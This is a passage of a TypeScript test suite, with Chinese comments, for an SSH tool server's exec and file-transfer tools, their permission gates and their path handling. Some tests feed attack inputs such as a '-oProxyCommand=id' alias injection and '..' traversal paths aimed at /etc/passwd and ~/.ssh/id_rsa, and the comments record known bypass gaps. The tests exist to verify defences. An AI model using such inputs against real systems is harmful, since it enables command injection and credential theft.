  it('SSHS-U-109: `_meta` 里的 toolCallId 就是门与卡片用的路由键，卡片写着目标机器', async () => {
    writeConfig('Host web\n')
    const { client, asks } = await open()

    await callTool(client, 'exec', execArgs(), { 'shuvix.dev/toolCallId': 'pi-call-9' })

    expect(optsOf().toolCallId).toBe('pi-call-9')
    expect(asks).toHaveLength(1)
    // `ssh <alias>: <command>`：批准一条 rm 时必须看得见它要跑在哪台机器上（J4）
    expect(asks[0]).toMatchObject({
      id: 'pi-call-9',
      kind: 'ask',
      toolName: 'mcp__ssh__exec',
      command: 'ssh web: uptime',
      description: 'check load'
    })
  })

  it('SSHS-U-110: 客户端没带 `_meta` 时回落到 `ssh-<requestId>`，绝不是空串', async () => {
    writeConfig('Host web\n')
    const { client, asks } = await open()

    await callTool(client, 'exec', execArgs())

    const id = optsOf().toolCallId
    // 空串会让所有并发的 ask 挤在同一个路由键上 —— 用户答了 A 却放行了 B
    expect(id).toMatch(/^ssh-.+$/)
    expect(asks[0].id).toBe(id)
  })
})

describe('ssh 内置服务器 exec 的结果翻译', () => {
  it('SSHS-U-111: 远端命令自己的非零码原样带回，不加任何 ssh 解释', async () => {
    writeConfig('Host web\n')
    control.result = { stdout: 'boom', stderr: '', exitCode: 7, timedOut: false }
    const { client } = await open()

    const r = await callTool(client, 'exec', execArgs())
    // 非零 ≠ 出错：命令做了什么由 agent 自己判断，isError 是留给「这次调用没成立」的
    expect(r.isError).toBeFalsy()
    expect(textOf(r)).toBe('boom\n\n[Exit code: 7]')
  })

  it('SSHS-U-112: 255 + 主机密钥没认过 → 翻成可操作的说明（ShuviX 不代写 known_hosts）', async () => {
    writeConfig('Host web\n')
    control.result = {
      stdout: '',
      stderr: 'Host key verification failed.',
      exitCode: 255,
      timedOut: false
    }
    const { client } = await open()

    const r = await callTool(client, 'exec', execArgs())
    expect(r.isError).toBe(true)
    expect(textOf(r)).toContain('ShuviX will not add it')
    expect(textOf(r)).toContain('in their own terminal')
  })

  it('SSHS-U-113: 255 但远端有输出 → 那是命令的意思，不翻译', async () => {
    writeConfig('Host web\n')
    // 远端确实连上了并打印了东西，255 只是它自己的退出码
    control.result = {
      stdout: 'exiting with 255 on purpose',
      stderr: 'Host key verification failed.',
      exitCode: 255,
      timedOut: false
    }
    const { client } = await open()

    const r = await callTool(client, 'exec', execArgs())
    expect(r.isError).toBeFalsy()
    expect(textOf(r)).toContain('[Exit code: 255]')
    expect(textOf(r)).not.toContain('ShuviX will not add it')
  })

  it('SSHS-U-114: 255 但认不出的 stderr → 原样加一行退出码，不硬编一个解释', async () => {
    writeConfig('Host web\n')
    control.result = {
      stdout: '',
      stderr: 'kex_exchange_identification: read: Connection reset by peer',
      exitCode: 255,
      timedOut: false
    }
    const { client } = await open()

    const r = await callTool(client, 'exec', execArgs())
    expect(r.isError).toBeFalsy()
    expect(textOf(r)).toBe(
      'kex_exchange_identification: read: Connection reset by peer\n\n[Exit code: 255]'
    )
  })

  it('SSHS-U-115: 超时说「超时」，不说「退出码 124」', async () => {
    writeConfig('Host web\n')
    control.result = { stdout: 'partial', stderr: '', exitCode: 124, timedOut: true }
    const { client } = await open()

    const r = await callTool(client, 'exec', execArgs({ timeout: 45 }))
    expect(textOf(r)).toBe('partial\n\n[Command timed out after 45s]')
    // 124 是本地这一侧编的，报给 agent 只会让它去查一个远端并不存在的退出码
    expect(textOf(r)).not.toContain('[Exit code: 124]')
  })

  it('SSHS-U-116: 输出全空时给一句 `(no output)`', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    expect(textOf(await callTool(client, 'exec', execArgs()))).toBe('(no output)')
  })

  it('SSHS-U-117: sshExec 自己起不来（没有 ssh 二进制）时，原因原样冒到调用方', async () => {
    writeConfig('Host web\n')
    control.result = new Error(
      'The `ssh` command was not found on this machine. Install OpenSSH and try again.'
    )
    const { client } = await open()

    await expect(client.callTool({ name: 'exec', arguments: execArgs() })).rejects.toThrow(
      /was not found on this machine/
    )
  })
})

describe('ssh 内置服务器 exec 的超时取值', () => {
  const timeoutOf = (i = 0): unknown => control.exec[i].timeoutSec

  it('SSHS-U-118: 缺省 120 秒，给了就用给的', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    await callTool(client, 'exec', execArgs())
    await callTool(client, 'exec', execArgs({ timeout: 30 }))

    expect([timeoutOf(0), timeoutOf(1)]).toEqual([120, 30])
  })

  it('SSHS-U-119: 离谱的大数被钳到 3600 秒', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    // 上限不是洁癖：setTimeout 超过 2^31-1 毫秒会被截成 1ms，
    // 于是「我要等很久」反而变成「立刻超时」—— 与模型的意图正好相反
    await callTool(client, 'exec', execArgs({ timeout: 999999999 }))
    expect(timeoutOf()).toBe(3600)

    // 另一端是同一类错误：floor 会把 0.5 变成 0，而 setTimeout(0) 同样立刻就烧
    await callTool(client, 'exec', execArgs({ timeout: 0.5 }))
    expect(timeoutOf(1)).toBe(1)
  })

  it('SSHS-U-120: 零 / 负数 / 不是数 —— 一律回落到 120', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    for (const timeout of [0, -5, 'abc']) {
      await callTool(client, 'exec', execArgs({ timeout }))
    }
    expect(control.exec.map((c) => c.timeoutSec)).toEqual([120, 120, 120])
  })
})

describe('ssh 内置服务器的中止', () => {
  it('SSHS-U-121: 用户在卡片上取消 → 这次调用以 Aborted 落定，远端一条没跑', async () => {
    writeConfig('Host web\n')
    const { client } = await open({ respond: async () => ({ kind: 'cancel', reason: 'aborted' }) })

    await expect(client.callTool({ name: 'exec', arguments: execArgs() })).rejects.toThrow(
      /Aborted/
    )
    expect(control.exec).toEqual([])
  })

  it('SSHS-U-122: 卡片还挂着时这次调用被取消 → 门放行了也不再跑', async () => {
    writeConfig('Host web\n')
    let release!: (r: InputResponse) => void
    const { client, asks } = await open({
      respond: () => new Promise<InputResponse>((r) => (release = r))
    })

    const ac = new AbortController()
    const pending = client.callTool({ name: 'exec', arguments: execArgs() }, undefined, {
      signal: ac.signal
    })
    // 等卡片真的挂起（门已经在等人答）
    while (asks.length === 0) await new Promise((r) => setTimeout(r, 1))

    ac.abort(new Error('user stopped the run'))
    await expect(pending).rejects.toThrow()

    release({ kind: 'ask', allowed: true })
    await new Promise((r) => setTimeout(r, 5))

    // 这才是可观测的契约：批准来晚了也不会补跑一条远端命令。
    // handleExec 那句 `return err('Aborted')` 本身走不到线上 —— SDK 对已取消的请求
    // 一律不发响应（protocol.ts 的 `if (abortController.signal.aborted) return`）。
    expect(control.exec).toEqual([])
  })
})

describe('ssh 内置服务器的 disconnect 与状态条', () => {
  it('SSHS-U-123: 本来连着 / 本来就没连，两种如实回报', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    control.wasConnected = true
    expect(textOf(await callTool(client, 'disconnect', { host: 'web' }))).toBe(
      'Closed the connection to "web".'
    )
    control.wasConnected = false
    expect(textOf(await callTool(client, 'disconnect', { host: 'web' }))).toBe(
      'There was no open connection to "web".'
    )
    expect(control.disconnect.map((d) => d.alias)).toEqual(['web', 'web'])
  })

  it('SSHS-U-124: 状态条 = 最后一条**成功**命令的主机；任何 disconnect 都清掉', async () => {
    writeConfig('Host web\n')
    const { client, events } = await open()

    await callTool(client, 'exec', execArgs())
    expect(events).toEqual([
      {
        type: 'runtime_event',
        runtimeId: 'ssh',
        status: { label: 'web', icon: 'Terminal', color: '#38bdf8' }
      }
    ])

    // J11（今天的行为，非缺陷）：非零退出不改状态条 —— 于是它写的是「最后一条跑成了的」，
    // 而不是「现在连着哪台」。连接本身其实还在（ControlPersist）。
    events.length = 0
    control.result = { stdout: 'nope', stderr: '', exitCode: 1, timedOut: false }
    await callTool(client, 'exec', execArgs())
    expect(events).toEqual([])

    // 同样是今天的行为：断开哪一台都把条清空，哪怕本来就没连着
    control.wasConnected = false
    await callTool(client, 'disconnect', { host: 'web' })
    expect(events).toEqual([{ type: 'runtime_event', runtimeId: 'ssh', status: null }])
  })

  it('SSHS-U-125: exec / disconnect 的 annotations 如实声明', async () => {
    writeConfig('Host web\n')
    const { client } = await open()
    const tools = (await client.listTools()).tools

    // 远端命令能做任何事 —— 别因为「多数命令只是看看」就把这两位调软
    expect(tools.find((t) => t.name === 'exec')?.annotations).toMatchObject({
      readOnlyHint: false,
      destructiveHint: true,
      idempotentHint: false,
      openWorldHint: true
    })
    // 断开是本地记账：关两次和关一次一个样，也不碰远端
    expect(tools.find((t) => t.name === 'disconnect')?.annotations).toMatchObject({
      readOnlyHint: false,
      destructiveHint: false,
      idempotentHint: true,
      openWorldHint: false
    })
  })

  it('SSHS-U-126: 会话释放只认**现在还在配置里**的别名 —— 今天的已知缺口（J9）', async () => {
    writeConfig('Host web\nHost api\n')
    const { clientTransport } = await open({ sessionId: 's-leak' })

    // 用户在会话期间把 web 从 ~/.ssh/config 里删了（改名、注释掉，都算）
    writeConfig('Host api\n')
    await clientTransport.close()
    await new Promise((r) => setTimeout(r, 5))

    expect(control.closeSession).toHaveLength(1)
    // 候选别名是**现读**配置得来的，而 socket 路径是 sessionId+别名哈希出来的：
    // 名字没了就再也算不回那条路径，那个 socket 于是留在 /tmp 里直到 ControlPersist 到期。
    // 这里钉的是今天的行为，不是它应该如此 —— 修法是把释放建立在会话自己的连接记账上。
    expect(control.closeSession[0]).toEqual({ sessionId: 's-leak', aliases: ['api'] })
  })
})

// ─── 文件传输（upload / download / sync）─────────────────────────────────
//
// 传输类工具比 exec 多一个客体：**本地那个文件**。于是这一组的主线是「本地那一侧走的
// 是不是和本地读写完全同一条路」—— up 当读、down 当写，`enforcePath` 一次，
// 于是 ask-on-read / ask-on-write / protect-credentials / protect-system 一条不漏。
// 漏一次的代价很具体：一条 upload 就能把 ~/.ssh/id_rsa 送出本机，而路径策略一次没被问到。
//
// sync 还多一道：rsync 把远端路径拼进一条交给远端**登录 shell** 的命令行，所以它
// 除了路径门还要过**白名单 + 命令门**，而 upload/download 走 SFTP（路径是协议字段）不必。

/** 传输类工具的一组齐全实参 —— 用例按需覆写其中一两个 */
const xferArgs = (patch: Record<string, unknown> = {}): Record<string, unknown> => ({
  host: 'web',
  localPath: '/ws/report.txt',
  remotePath: '/srv/report.txt',
  ...patch
})

/** sync 还要一个方向 */
const syncArgs = (patch: Record<string, unknown> = {}): Record<string, unknown> =>
  xferArgs({ direction: 'up', ...patch })

/** 三个传输工具 × 它们各自的齐全实参（「三者一致」的断言按它遍历） */
const ALL_TRANSFERS: Array<[string, (p?: Record<string, unknown>) => Record<string, unknown>]> = [
  ['upload', xferArgs],
  ['download', xferArgs],
  ['sync', syncArgs]
]

/** 路径门后拿到的 opts */
const pathOptsOf = (i = 0): Record<string, unknown> =>
  gate.pathCalls[i].opts as Record<string, unknown>

/**
 * 询问卡片的 ask 分支。`InputRequest` 是判别联合（ask / choice），直接取 `command`
 * 这些字段前要先收窄 —— 而「弹出来的到底是不是一张 ask」本身就该是断言的一部分。
 */
const askCards = (asks: InputRequest[]): AskInputRequest[] =>
  asks.map((r, i) => {
    if (r.kind !== 'ask') throw new Error(`asks[${i}] 是 ${r.kind}，不是一张 ask 卡片`)
    return r
  })

/** 这一轮到底传了没有（两个出口合起来看） */
const transfers = (): Array<Record<string, unknown>> => [...control.copy, ...control.sync]

describe('ssh 内置服务器传输类工具的别名复核', () => {
  it('SSHS-U-131: 三个工具的未知别名与 exec 逐字同一句，且不惊动策略、不传一个字节', async () => {
    writeConfig('Host web\nHost api\n')
    const { client, asks } = await open()
    const expected = `"nope" is not a host alias in ${configPath}. Only these aliases can be used: web, api.`

    // exec 那一句是基准（SSHS-U-98）：同一道复核写出四句不同的话，
    // 用户与模型就会以为背后是四个机制
    expect(textOf(await callTool(client, 'exec', execArgs({ host: 'nope' })))).toBe(expected)
    for (const [name, args] of ALL_TRANSFERS) {
      const r = await callTool(client, name, args({ host: 'nope' }))
      expect(r.isError).toBe(true)
      expect(textOf(r)).toBe(expected)
    }

    expect(gate.pathCalls).toEqual([])
    expect(asks).toEqual([])
    expect(transfers()).toEqual([])
  })

  it('SSHS-U-132: 一台都没配时，三个工具也换那句「去 ~/.ssh/config 里加一台」', async () => {
    writeConfig('')
    const { client } = await open()

    for (const [name, args] of ALL_TRANSFERS) {
      expect(textOf(await callTool(client, name, args({ host: 'nope' })))).toBe(
        `No SSH host aliases are defined in ${configPath}, so "nope" cannot be reached. Ask the user to add a Host entry there.`
      )
    }
    expect(transfers()).toEqual([])
  })

  it('SSHS-U-133: host 缺席 / 不是字符串 / 只有空白 —— 三个工具同一句「必填」', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    for (const [name, args] of ALL_TRANSFERS) {
      for (const patch of [{ host: undefined }, { host: 42 }, { host: '   ' }]) {
        const r = await callTool(client, name, args(patch))
        expect(r.isError).toBe(true)
        expect(textOf(r)).toBe('A `host` alias is required.')
      }
    }
    expect(gate.pathCalls).toEqual([])
    expect(transfers()).toEqual([])
  })

  it('SSHS-U-134: `-` 开头的记号即便写在配置里，三个工具的第二道门也不认', async () => {
    writeConfig('Host -oProxyCommand=id\nHost web\n')
    const { client } = await open()

    for (const [name, args] of ALL_TRANSFERS) {
      const r = await callTool(client, name, args({ host: '-oProxyCommand=id' }))
      expect(r.isError).toBe(true)
      // 别名原样进 scp / rsync 的 argv，一个 `-o…` 就是**本地**任意命令执行
      expect(textOf(r)).toBe('"-oProxyCommand=id" is not a usable host alias.')
    }
    expect(transfers()).toEqual([])
  })

  it('SSHS-U-135: 别名复核在路径门**之前** —— 名字都不成立的目标不该弹卡片', async () => {
    writeConfig('Host web\n')
    const { client, asks } = await open()

    // 这个本地路径在工作目录外，过得了门就必然弹一张 ask-on-read 的卡
    const r = await callTool(client, 'upload', xferArgs({ host: 'nope', localPath: '/outside/x' }))
    expect(r.isError).toBe(true)
    expect(textOf(r)).toContain('is not a host alias')
    expect(gate.pathCalls).toEqual([])
    expect(asks).toEqual([])
  })

  it('SSHS-U-136: 带冒号的别名照样过关，并原样改写 scp/rsync 的目标 —— 今天的缺口', async () => {
    // `isConnectableAlias` 只滤 `!` / `-` 前缀与通配，冒号不在其列（SSHC-U-85）
    writeConfig('Host we:b\n')
    const { client } = await open()

    const r = await callTool(client, 'upload', xferArgs({ host: 'we:b' }))
    expect(r.isError).toBeFalsy()
    // sshCopy 拼的是 `${alias}:${remotePath}` = `we:b:/srv/report.txt`，而 scp 按
    // **第一个**冒号切分 —— 于是真正连的是主机 `we`，路径变成 `b:/srv/report.txt`。
    // 用户在配置里核对过的那一条（`we:b`）根本不是 ssh 解析的那一条。
    // 这里钉的是今天的行为，不是它应该如此 —— 修法是把冒号也列进 isConnectableAlias
    expect(control.copy[0]).toMatchObject({ alias: 'we:b', remotePath: '/srv/report.txt' })
  })
})

describe('ssh 内置服务器传输类工具的必填项', () => {
  it('SSHS-U-137: localPath / remotePath 缺席或只有空白 —— 各自一句，且不过门', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    for (const [name, args] of ALL_TRANSFERS) {
      for (const patch of [{ localPath: undefined }, { localPath: '   ' }, { localPath: 42 }]) {
        expect(textOf(await callTool(client, name, args(patch)))).toBe('A `localPath` is required.')
      }
      for (const patch of [{ remotePath: undefined }, { remotePath: '  ' }, { remotePath: 42 }]) {
        expect(textOf(await callTool(client, name, args(patch)))).toBe(
          'A `remotePath` is required.'
        )
      }
    }
    // 一张写着空路径的卡片，用户既看不懂也批不了
    expect(gate.pathCalls).toEqual([])
    expect(transfers()).toEqual([])
  })

  it('SSHS-U-138: sync 的 direction 缺席或不认识 → 一句话，且在路径之前就回绝', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    for (const patch of [
      { direction: undefined },
      { direction: 'sideways' },
      { direction: 'UP' }
    ]) {
      const r = await callTool(client, 'sync', syncArgs(patch))
      expect(r.isError).toBe(true)
      expect(textOf(r)).toBe('`direction` must be "up" or "down".')
    }
    // 方向决定本地那一侧是读还是写，所以它必须在过路径门之前就定下来
    expect(gate.pathCalls).toEqual([])
    expect(control.sync).toEqual([])
  })

  it('SSHS-U-139: upload / download 无视传进来的 direction —— 方向由工具名定死', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    // schema 里 `additionalProperties: false`，但低层 Server 不校验入参，
    // 所以一个多余的 direction 真的会抵达处理函数 —— 它必须被忽略而不是被采信
    await callTool(client, 'upload', xferArgs({ direction: 'down' }))
    await callTool(client, 'download', xferArgs({ direction: 'up' }))

    expect(gate.pathCalls.map((c) => c.mode)).toEqual(['read', 'write'])
    expect(control.copy.map((c) => c.direction)).toEqual(['up', 'down'])
  })
})

// ─── 本地路径的解析 ──────────────────────────────────────────────────────
//
// 路径策略按**路径段前缀**比对，自己不做归一化。所以这一层交给它什么字符串，
// 策略就照什么字符串判 —— 归一化做少了是安全门被绕开，做多了是把用户的字面路径改掉。

describe('ssh 内置服务器传输类工具的本地路径解析', () => {
  it('SSHS-U-140: 相对路径按会话工作目录解析', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    await callTool(client, 'upload', xferArgs({ localPath: 'sub/report.txt' }))
    expect(gate.pathCalls[0].path).toBe('/ws/sub/report.txt')
    expect(control.copy[0].localPath).toBe('/ws/sub/report.txt')
  })

  it('SSHS-U-141: 绝对路径原样过去', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    await callTool(client, 'download', xferArgs({ localPath: '/var/data/report.txt' }))
    expect(gate.pathCalls[0].path).toBe('/var/data/report.txt')
  })

  it('SSHS-U-142: `~/…` **不**展开 —— 今天的缺口（与 resolveToCwd 不一致）', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    await callTool(client, 'upload', xferArgs({ localPath: '~/secrets.txt' }))
    // `~` 只是一个普通目录名，于是策略看到的是工作目录里一个叫 `~` 的子目录 ——
    // 用户以为自己写的是家目录，protect-credentials 却因此一次也不响。
    // 钉的是今天的行为：要修就去共用 resolveToCwd 那条路
    expect(gate.pathCalls[0].path).toBe('/ws/~/secrets.txt')
  })

  it('SSHS-U-143: 前导 `@` 不剥、unicode 空格不归一 —— 同一处缺口的另两面', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    await callTool(client, 'upload', xferArgs({ localPath: '@report.txt' }))
    expect(gate.pathCalls[0].path).toBe('/ws/@report.txt')

    // U+00A0（不换行空格）：从聊天里粘路径时的常客。本地工具的 expandPath 里那道
    // normalizeUnicodeSpaces 会把它**整串**换成普通空格，这里一个都不换 —— 所以它必须
    // 放在路径**中间**才看得出分叉（放两头会被 trim 吃掉，它算 JS 的空白）
    await callTool(client, 'upload', xferArgs({ localPath: 're\u00a0port.txt' }))
    expect(gate.pathCalls[1].path).toBe('/ws/re\u00a0port.txt')
    // 代价很具体：策略与 allowList 比的是字符串，于是「同一个文件」在本地读写
    // 和 ssh 上传两条路上成了两个不同的 key
    expect(gate.pathCalls[1].path).not.toBe('/ws/re port.txt')
  })

  it('SSHS-U-144: 绝对路径里的 `..` **会**被折掉 —— 不折就是安全门整个被绕开', async () => {
    writeConfig('Host web\n')
    const { client, asks } = await open()

    await callTool(client, 'upload', xferArgs({ localPath: '/ws/../../etc/passwd' }))

    // 策略的匹配是按段前缀比的：不归一化时 `/ws/../../etc/passwd` 会被判成
    // 「在工作目录内」，于是 ask-on-read 不响、护着凭据的那条也不响
    expect(gate.pathCalls[0].path).toBe('/etc/passwd')
    expect(asks).toHaveLength(1)

    // 同一道折叠的真正代价面：私钥。不折时这条路径会被判成「在工作目录内」，
    // 于是护着凭据的那条策略一次也不响，id_rsa 就这么送出了本机
    await callTool(client, 'upload', xferArgs({ localPath: '/ws/../home/u/.ssh/id_rsa' }))
    expect(gate.pathCalls[1].path).toBe('/home/u/.ssh/id_rsa')
    expect(askCards(asks)[1].policyPrompt?.policies).toContain(
      'Protect Some Credential Directories'
    )
  })

  it('SSHS-U-145: localPath 两头的空白被 trim 掉', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    await callTool(client, 'upload', xferArgs({ localPath: '  /ws/report.txt \t' }))
    expect(gate.pathCalls[0].path).toBe('/ws/report.txt')
    // 卡片上写的是 trim 之后的原文，而不是用户敲进来的那一串
    expect(pathOptsOf().displayPath).toBe('/ws/report.txt')
  })

  it('SSHS-U-146: 末尾斜杠 —— 相对与绝对**同样**被抹掉（原先的不对称已随 resolve 一并消失）', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    await callTool(client, 'upload', xferArgs({ localPath: 'dir/' }))
    await callTool(client, 'upload', xferArgs({ localPath: '/a/dir/' }))

    // SSHS-U-144 那道 `resolve()` 是为折 `..` 加的，顺手也把绝对路径的末尾斜杠抹了 ——
    // 于是「相对丢、绝对留」的不对称今天已经不存在，两边都丢
    expect(gate.pathCalls.map((c) => c.path)).toEqual(['/ws/dir', '/a/dir'])
    // 而卡片上的 displayPath 走的是另一条路（原文），两边都**留着**那道斜杠
    expect([pathOptsOf(0).displayPath, pathOptsOf(1).displayPath]).toEqual(['dir/', '/a/dir/'])
  })
})

// ─── 本地那一侧的文件访问策略 ────────────────────────────────────────────

describe('ssh 内置服务器传输类工具的路径门', () => {
  it('SSHS-U-147: 方向决定读还是写，每次调用恰好过一次门', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    await callTool(client, 'upload', xferArgs())
    expect(gate.pathCalls).toHaveLength(1)
    expect(gate.pathCalls[0].mode).toBe('read')

    await callTool(client, 'download', xferArgs())
    await callTool(client, 'sync', syncArgs({ direction: 'up' }))
    await callTool(client, 'sync', syncArgs({ direction: 'down' }))

    // up = 本地当源（读），down = 本地当目标（写）—— sync 两个方向各算一边
    expect(gate.pathCalls.map((c) => c.mode)).toEqual(['read', 'write', 'read', 'write'])
  })

  it('SSHS-U-148: 上报的 opts 恰是那六项，**没有** onOther', async () => {
    writeConfig('Host web\n')
    const { client } = await open()

    await callTool(client, 'upload', xferArgs(), { 'shuvix.dev/toolCallId': 'tc-9' })

    expect(gate.pathCalls[0].opts).toStrictEqual({
      toolCallId: 'tc-9',
      toolName: 'mcp__ssh__upload',
      displayPath: '/ws/report.txt',
      // 不写这句，卡片就和一次本地读文件长得一模一样 —— 用户看不出这个文件正要离开本机
      description: 'Send to "web": /srv/report.txt',
      abortError: 'Aborted',
      // 没有输入面板时 fail-closed
      missingChannel: 'deny'
    })
    // exec 那边是 `onOther: 'return'`（反馈作为正常结果带回），路径这边刻意不给 ——
    // 于是一次「改说其它」在这里会抛，与本地读写的处置一致
    expect('onOther' in pathOptsOf()).toBe(false)
  })

  it('SSHS-U-149: ask-on-read 只对工作目录**外**的 upload 响', async () => {
    writeConfig('Host web\n')
    const { client, asks } = await open()

    await callTool(client, 'upload', xferArgs({ localPath: '/ws/inside.txt' }))
    expect(asks).toEqual([])

    await callTool(client, 'upload', xferArgs({ localPath: '/outside/secret.txt' }))
    expect(asks).toHaveLength(1)
    // 卡片上的记忆条目形状 = 本地读写那套（`Read(<abs>)`），一个字都没变
    expect(asks[0]).toMatchObject({
      kind: 'ask',
      toolName: 'mcp__ssh__upload',
      command: 'Read(/outside/secret.txt)'
    })
    // 卡片上列的是策略的**显示名**（用户在设置里看到的那个），不是内部 id
    expect(askCards(asks)[0].policyPrompt?.policies).toEqual(['Ask Before Reading a File'])
  })

  it('SSHS-U-150: ask-on-write 对**每一次** download 都响，工作目录里也一样', async () => {
    writeConfig('Host web\n')
    const { client, asks } = await open()

    await callTool(client, 'download', xferArgs({ localPath: '/ws/inside.txt' }))
    await callTool(client, 'download', xferArgs({ localPath: '/outside/x.txt' }))

    // 写会覆盖盘上的东西，所以这条策略不看位置 —— 一次 download 就能悄悄换掉工作目录里的文件
    expect(asks).toHaveLength(2)
    expect(askCards(asks).map((a) => a.command)).toEqual([
      'Write(/ws/inside.txt)',
      'Write(/outside/x.txt)'
    ])
    expect(askCards(asks)[0].policyPrompt?.policies).toEqual(['Ask Before Writing a File'])
  })

  it('SSHS-U-151: protect-credentials 拒掉往 ~/.ssh 的 download —— 免询问也压不过', async () => {
    writeConfig('Host web\n')
    gate.autoAllow = true
    const { client, asks } = await open()

    const r = await callTool(
      client,
      'download',
      xferArgs({ localPath: '/home/u/.ssh/authorized_keys' })
    )
    expect(r.isError).toBe(true)
    expect(textOf(r)).toContain("Denied by security policy rule 'protect-credentials#0'")
    // deny 不弹卡片，它唯一的露出面就是那段文字
    expect(asks).toEqual([])
    // 一条 download 往 authorized_keys 里写 = 把这台机器交出去
    expect(control.copy).toEqual([])
  })

  it('SSHS-U-152: protect-system 拒掉往 /etc 的 download —— 免询问也压不过', async () => {
    writeConfig('Host web\n')
    gate.autoAllow = true
    const { client } = await open()

    const r = await callTool(client, 'download', xferArgs({ localPath: '/etc/passwd' }))
    expect(r.isError).toBe(true)
    expect(textOf(r)).toContain("Denied by security policy rule 'protect-system#0'")
    expect(control.copy).toEqual([])
  })
})

describe('ssh 内置服务器传输类工具的询问应答', () => {
  it('SSHS-U-153: 路径被 deny → 一条 isError 结果（**不是**协议级拒绝），带着归因', async () => {
    writeConfig('Host web\n')
    gate.policies.push(
      userPolicy('no-upload', [
        { effect: 'deny', action: ['read'], match: "object.type == 'path'" }
      ])
    )
    const { client } = await open()

    const r = await callTool(client, 'upload', xferArgs())

    // exec 那边同样的 deny 是把调用整个拒掉（SSHS-U-106：callTool 直接 reject），
    // 这边 prepareTransfer 把异常收进 `{ error }` 再转成 isError —— 两条路形态不同。
    // 钉的是今天的行为：对模型来说 isError 也读得懂，但它和 exec 不是一种协议形状
    expect(r.isError).toBe(true)
    expect(textOf(r)).toContain("Denied by security policy rule 'no-upload#0'")
    expect(control.copy).toEqual([])
  })

  it('SSHS-U-154: 这条会话没有输入面板 → fail-closed，一个字节都不传', async () => {
    writeConfig('Host web\n')
    const { client } = await open({ respond: null })

    const r = await callTool(client, 'upload', xferArgs({ localPath: '/outside/secret.txt' }))
    expect(r.isError).toBe(true)
    // 路径客体的无通道文案（与本地读写同一句）
    expect(textOf(r)).toBe(
      'Access denied: path outside workspace and no way to ask: /outside/secret.txt'
    )
    expect(control.copy).toEqual([])
  })

  it('SSHS-U-155: 用户在卡片上取消 → isError Aborted，没传', async () => {
    writeConfig('Host web\n')
    const { client } = await open({ respond: async () => ({ kind: 'cancel', reason: 'aborted' }) })

    const r = await callTool(client, 'download', xferArgs())
    expect(r.isError).toBe(true)
    expect(textOf(r)).toBe('Aborted')
    expect(control.copy).toEqual([])
  })

  it('SSHS-U-156: 用户改说「其它」→ 走的是「拒绝访问并附反馈」那句，而不是 exec 的正常结果', async () => {
    writeConfig('Host web\n')
    const { client } = await open({
      respond: async () => ({ kind: 'other', text: 'put it in /tmp instead' })
    })

    const r = await callTool(client, 'download', xferArgs())
    // 因为路径门没给 onOther: 'return'（SSHS-U-148）—— exec 那边同样的应答是一条
    // 非错误结果，这边是 isError。两个工具在同一张卡片上给出两种形态，是今天的行为
    expect(r.isError).toBe(true)
    expect(textOf(r)).toBe(
      'User declined access to /ws/report.txt and provided feedback instead: put it in /tmp instead'
    )
    expect(control.copy).toEqual([])
  })

  it('SSHS-U-157: 「允许并记住」把本地那一侧的授权真的落下来', async () => {
    writeConfig('Host web\n')
    const { client, asks } = await open({
      respond: async () => ({ kind: 'ask', allowed: true, extra: { rememberPath: true } })
    })

    await callTool(client, 'upload', xferArgs({ localPath: '/outside/secret.txt' }))
    await callTool(client, 'download', xferArgs({ localPath: '/outside/out.txt' }))

    // 记住的是**本地读写**那套条目（`Read(<abs>)` / `Write(<abs>)`）：于是这颗复选框
    // 不只放开了这次传输，也放开了之后 read / write 工具对同一路径的访问 —— 今天的行为
    expect(askCards(asks).map((a) => a.command)).toEqual([
      'Read(/outside/secret.txt)',
      'Write(/outside/out.txt)'
    ])
    expect(gate.grants).toEqual([
      { mode: 'read', path: '/outside/secret.txt' },
      { mode: 'write', path: '/outside/out.txt' }
    ])
  })

  it('SSHS-U-158: `_meta` 的 toolCallId 是路由键，没带时回落到 `ssh-<requestId>`', async () => {
    writeConfig('Host web\n')
    const { client, asks } = await open()

    await callTool(client, 'download', xferArgs(), { 'shuvix.dev/toolCallId': 'pi-call-3' })
    expect(pathOptsOf(0).toolCallId).toBe('pi-call-3')
    expect(asks[0].id).toBe('pi-call-3')

    await callTool(client, 'download', xferArgs())
    // 空串会让所有并发的 ask 挤在同一个路由键上 —— 用户答了 A 却放行了 B
    expect(pathOptsOf(1).toolCallId).toMatch(/^ssh-.+$/)
    expect(asks[1].id).toBe(pathOptsOf(1).toolCallId)
  })

  it('SSHS-U-159: 卡片上写着目标机器与方向 —— 否则它和一次本地读写长得一模一样', async () => {
    writeConfig('Host web\nHost api\n')
    const { client, asks } = await open()

    // upload 的本地路径要在工作目录**外**，否则 ask-on-read 不响、根本没有卡片
    await callTool(
      client,
      'upload',
      xferArgs({ host: 'api', localPath: '/outside/a', remotePath: '/srv/a' })
    )
    await callTool(client, 'download', xferArgs({ host: 'web', remotePath: '/srv/b' }))
    await callTool(
      client,
      'sync',
      syncArgs({ host: 'api', direction: 'down', remotePath: '/srv/c' })
    )

    // 用户批准的是「这个文件离开本机 / 那台机器上的东西落到这里」，而不是「读一个文件」。
    // sync down 会弹**两**张：先路径门（本地当目标 = 写），再命令门（远端真的会跑的那条）——
    // 两张都得说清是哪台机器、哪个方向
    expect(askCards(asks).map((a) => a.description)).toEqual([
      'Send to "api": /srv/a',
      'Receive from "web": /srv/b',
      'Receive from "api": /srv/c',
      'Sync from "api": /ws/report.txt <-> /srv/c'
    ])
    // 描述是过门时就定下来的，与策略最终问不问无关
    expect(gate.pathCalls.map((c) => (c.opts as { description: string }).description)).toEqual([
      'Send to "api": /srv/a',
      'Receive from "web": /srv/b',
      'Receive from "api": /srv/c'
    ])
  })

  it('SSHS-U-160: 卡片还挂着时这次调用被取消 → 批准来晚了也不补传', async () => {
